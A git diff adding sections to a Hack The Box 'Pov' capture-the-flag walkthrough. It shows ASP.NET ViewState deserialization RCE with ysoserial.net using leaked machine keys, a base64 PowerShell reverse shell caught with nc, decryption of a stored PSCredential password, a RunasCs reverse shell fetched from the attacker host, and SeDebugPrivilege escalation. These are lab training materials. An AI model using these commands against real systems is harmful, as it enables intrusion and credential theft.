@@ -192,6 +192,8 @@ That said, inspecting the page’s source code revealed something much more inte
   </a>
 </p>
 
+### Shell as sfitz
+
 The Download CV link triggers the JavaScript function __doPostBack('download', ''). What really stands out here are the __VIEWSTATEGENERATOR and __EVENTVALIDATION fields involved in the request. A quick search shows that these are part of the ASP.NET WebForms framework, confirming that the application is running on WebForms.
 
 While trying to capture the download with Burp Suite, no POST request was showing up, which made traffic analysis a bit tricky. Because of that, I decided to rely exclusively on Burp’s intercept mode moving forward.
@@ -260,17 +262,205 @@ With a working LFI, I'll always look into interesting files, such as databases o
   </a>
 </p>
 
+### RCE
+
 A quick search on google would tell us what machineKeys is and what is it used for in the ASP.NET environment. A little bit deeper research leads to this [post](https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet) which talks about deserialization from 2019.
 
-Following this post and the official repo, we can get a good idea on how to craft our payload with [ysoserial.net](https://github.com/frohoff/ysoserial). For agility purposes, we'll run the .exe in linux with mono. The flags we want are the following:
+Following this post and the official repo, we can get a good idea on how to craft our payload with [ysoserial.net](https://github.com/frohoff/ysoserial). For agility purposes, we'll run the .exe in linux with wine. The flags we want are the following:
 
-- -p ViewState to set the ViewState plugin
-- -g WindowsIdentity, this is the gadget to use, usually discovered by trial and error. Many will work here.
-- --da="AES", the decryption algorithm, provided in the web.config.
-- --dk="74477.....3", decryption key from the web.config.
-- --va="SHA1", validation algorithm provided in the web.config.
-- --vk="5620D3D0...68", validation key from the web.config.
-- --path="/portfolio", also included in the web.config.
-- -c "ping 10.10.14.nopeek", the command to run, for a test I'll run a simple ping.
+- `-p ViewState` to set the ViewState plugin
+- `-g WindowsIdentity`, this is the gadget to use, usually discovered by trial and error. Many will work here.
+- `--da="AES"`, the decryption algorithm, provided in the web.config.
+- `--dk="74477.....3"`, decryption key from the web.config.
+- `--va="SHA1"`, validation algorithm provided in the web.config.
+- `--vk="56......68"`, validation key from the web.config.
+- `--path="/portfolio"`, also included in the web.config.
+- `-c "ping 10.10.14.nopeek"`, the command to run, for a test I'll run a simple ping.
 
+```bash
+wine ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "ping 10.10.14.nopeek"
+
+sTU3OeD...E2hSeV4h2A%3D%3Dk
+```
+
+The generated payload is base64 encoded. We'll now pass it to the server through the `VIEWSTATE` parameter.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/pov/Release]
+└─$ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+12:08:42.329343 IP dev.pov.htb > 10.10.14.X: ICMP echo request, id 1, seq 1, length 40
+12:08:42.330125 IP 10.10.14.X > dev.pov.htb: ICMP echo reply, id 1, seq 1, length 40
+```
+
+The desarialization works and we have achieved a succesful RCE. Now, we have to craft another payload that gives us a shell. For this case, I used the base64 powershell reverse shell.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/pov/Release]
+└─$ wine ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGs...B0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+
+kUOomfyVqqPXAG0tQAw9JYSQsSsVfxFMuU9Dsb38ellpx...
+```
+
+After a couple of minutes I receive a connection.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/pov/Release]
+└─$ nc -lvnp 9001                                                       
+listening on [any] 9001 ...
+connect to [10.10.14.X] from (UNKNOWN) [10.129.70.227] 49671
+
+PS C:\windows\system32\inetsrv> whoami
+pov\sfitz
+```
+
+### Shell as alaading
+
+sfitz doesn't have the flag and after taking a look at the machine, we can see there's another user named alaading, which would be the next target. I spent a couple of minutes manually reviewing the machine for something interesting.
+
+I found a .xml file inside the `documents` folder in sfitz home.
+
+```bash
+PS C:\Users\sfitz> cd Documents
+PS C:\Users\sfitz\Documents> ls
+
+
+    Directory: C:\Users\sfitz\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       12/25/2023   2:26 PM           1838 connection.xml                                                        
+
+```
+
+```bash
+PS C:\Users\sfitz\Documents> cat connection.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">alaading</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+
+This looks like a configuration file with an encrypted password inside. Upon searching on google, I hit this [web](https://stackoverflow.com/questions/63639876/powershell-password-decrypt) first which leds me to the function `"Import-Clixml"`. Looking around for a way to decrypt the password using this function, I found this [post](https://www.reddit.com/r/PowerShell/comments/rwy921/powershell_encrypting_and_decrypting_a_password/) on reddit which pretty much answers my question.
+
+Following the post, these are the commands.
+
+```bash
+PS C:\Users\sfitz\Documents> $cred = Import-Clixml -Path 'C:\\Users\\sfitz\\Documents\\connection.xml'
+PS C:\Users\sfitz\Documents> $cred.getnetworkcredential().password      
+f8gQ8fynP44ek1m3
+````
+
+Just to note that in the reddit post it says `"$cred.getnetworkcredential.password"`, this will be just a reference to the method and it will not be executed. To receive output and actually execute the method we need to add the parentheses.
+
+Moving on, we have a plaintext password for the user alaading however, we don't have WinRM or anywhere to use it directly, so we'll rely on [RunasCS](https://github.com/antonioCoco/RunasCs), which allows to execute commands as another user with our current shell as long as we have the correct credentials.
+
+### Shell as alaading
+
+```bash
+PS C:\Users\sfitz\Desktop> iwr -uri http://10.10.14.X/RunasCs.exe -o RunasCs.exe
+PS C:\Users\sfitz\Desktop> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.X:9001
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-d6af7$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1964 created in background.
+PS C:\Users\sfitz\Desktop> 
+```
+After a couple of seconds I receive a shell.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/pov/Release]
+└─$ nc -lvnp 9001                                                       
+listening on [any] 9001 ...
+connect to [10.10.14.X] from (UNKNOWN) [10.129.70.227] 49673
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+pov\alaading
+
+C:\Windows\system32>
+```
+
+Our user.txt is also there.
+
+```bash
+PS C:\Users\alaading\Desktop> ls
+ls
+
+
+    Directory: C:\Users\alaading\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---         2/5/2026   8:35 AM             34 user.txt                                                              
+
+
+PS C:\Users\alaading\Desktop> cat user.txt
+cat user.txt
+0a2...
+PS C:\Users\alaading\Desktop> 
+```
+
+### Shell as administrator
+
+A quick enumeration on our privileges with alaading reveals our next step.
+
+```bash
+PS C:\Users\alaading\Desktop> whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name    SID                                          
+============ =============================================
+pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Enabled 
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+PS C:\Users\alaading\Desktop> 
+```
+
+We have ``SeDebugPrivilege` enabled, which allows us to interact with and manipulate other processes on the system. If we target a process running as SYSTEM, we can abuse this privilege to inject code or dump sensitive memory, effectively inheriting SYSTEM-level privileges and achieving command execution as SYSTEM.
+
+To achieve this, I will be using [psgetsystem](https://github.com/decoder-it/psgetsystem).
 
